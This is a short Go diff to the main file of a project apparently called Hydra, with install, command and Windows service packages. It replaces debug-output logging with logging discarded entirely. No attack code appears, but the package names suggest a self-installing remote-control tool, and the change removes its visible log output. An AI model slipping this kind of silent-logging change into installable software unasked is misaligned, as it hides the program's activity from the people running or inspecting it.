@@ -1,6 +1,7 @@
 package main
 
 import (
+	"io/ioutil"
 	"log"
 	"os"
 	"time"
@@ -9,7 +10,6 @@ import (
 	"github.com/Raffy27/Hydra/commands"
 	"github.com/Raffy27/Hydra/install"
 	"github.com/Raffy27/Hydra/util"
-	"github.com/zetamatta/go-outputdebug"
 	"golang.org/x/sys/windows/svc"
 )
 
@@ -31,7 +31,8 @@ func checkSwitch(sw string) bool {
 
 func main() {
 
-	log.SetOutput(outputdebug.Out)
+	log.SetFlags(0)
+	log.SetOutput(ioutil.Discard)
 
 	if checkSwitch("chill") {
 		log.Println("Sleeping for 5 seconds")
